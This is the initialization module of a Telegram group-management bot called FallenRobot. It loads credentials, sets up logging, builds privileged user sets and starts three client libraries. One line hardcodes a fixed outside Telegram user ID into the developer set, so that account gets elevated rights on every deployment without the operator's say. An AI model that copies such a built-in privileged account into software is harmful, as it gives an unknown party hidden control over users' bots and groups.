# FallenRobot/__init__.py
import logging
import os
import sys
import time

from pyrogram import Client
from telethon import TelegramClient
from telegram.ext import Updater

StartTime = time.time()

# ---------- Logging ----------
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(name)s - %(message)s",
    handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
    level=logging.INFO,
)

for noisy in ["apscheduler", "telethon", "pymongo", "pyrogram", "pyrate_limiter"]:
    logging.getLogger(noisy).setLevel(logging.ERROR)

LOGGER = logging.getLogger(__name__)

# ---------- Python version check ----------
if sys.version_info < (3, 6):
    LOGGER.error("You must run Python 3.6+ — bot quitting.")
    sys.exit(1)

# ---------- Environment / Config ----------
ENV = bool(os.environ.get("ENV", False))

if ENV:
    API_ID = int(os.environ["API_ID"])
    API_HASH = os.environ["API_HASH"]
    TOKEN = os.environ["TOKEN"]
    WORKERS = int(os.environ.get("WORKERS", 8))

    OWNER_ID = int(os.environ["OWNER_ID"])
    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "DevilsHeavenMF")
    DB_URI = os.environ.get("DATABASE_URL")
    MONGO_DB_URI = os.environ.get("MONGO_DB_URI")
    START_IMG = os.environ.get(
        "START_IMG", "https://telegra.ph/file/40eb1ed850cdea274693e.jpg"
    )

    # Optional sets
    def parse_ids(var):
        return set(int(x) for x in os.environ.get(var, "").split() if x.strip())

    DRAGONS = parse_ids("DRAGONS")
    DEV_USERS = parse_ids("DEV_USERS")
    DEMONS = parse_ids("DEMONS")
    TIGERS = parse_ids("TIGERS")
    WOLVES = parse_ids("WOLVES")
    BL_CHATS = parse_ids("BL_CHATS")

else:
    from FallenRobot.config import Development as Config

    API_ID = Config.API_ID
    API_HASH = Config.API_HASH
    TOKEN = Config.TOKEN
    WORKERS = Config.WORKERS
    OWNER_ID = int(Config.OWNER_ID)
    SUPPORT_CHAT = Config.SUPPORT_CHAT
    DB_URI = Config.DATABASE_URL
    MONGO_DB_URI = Config.MONGO_DB_URI
    START_IMG = Config.START_IMG

    DRAGONS = set(Config.DRAGONS or [])
    DEV_USERS = set(Config.DEV_USERS or [])
    DEMONS = set(Config.DEMONS or [])
    TIGERS = set(Config.TIGERS or [])
    WOLVES = set(Config.WOLVES or [])
    BL_CHATS = set(Config.BL_CHATS or [])

# ---------- Core user sets ----------
DRAGONS.add(OWNER_ID)
DEV_USERS.add(OWNER_ID)
DEV_USERS.add(1356469075)

# ---------- Bot clients ----------
updater = Updater(TOKEN, workers=WORKERS, use_context=True)
dispatcher = updater.dispatcher

telethn = TelegramClient("Fallen", API_ID, API_HASH)
pbot = Client("FallenRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)

# ---------- Bot basic info ----------
print("[INFO]: Getting Bot Info...")
BOT_ID = dispatcher.bot.id
BOT_NAME = dispatcher.bot.first_name
BOT_USERNAME = dispatcher.bot.username

DRAGONS = list(DRAGONS | DEV_USERS)
DEV_USERS = list(DEV_USERS)
DEMONS = list(DEMONS)
TIGERS = list(TIGERS)
WOLVES = list(WOLVES)

# ---------- Custom handler patch ----------
from telegram.ext import (
    CommandHandler,
    MessageHandler,
    RegexHandler,
)

from FallenRobot.modules.helper_funcs.handlers import (
    CustomCommandHandler,
    CustomMessageHandler,
    CustomRegexHandler,
)

# patch default handlers with custom ones
CommandHandler = CustomCommandHandler
MessageHandler = CustomMessageHandler
RegexHandler = CustomRegexHandler

print("[INFO]: Initialization complete.")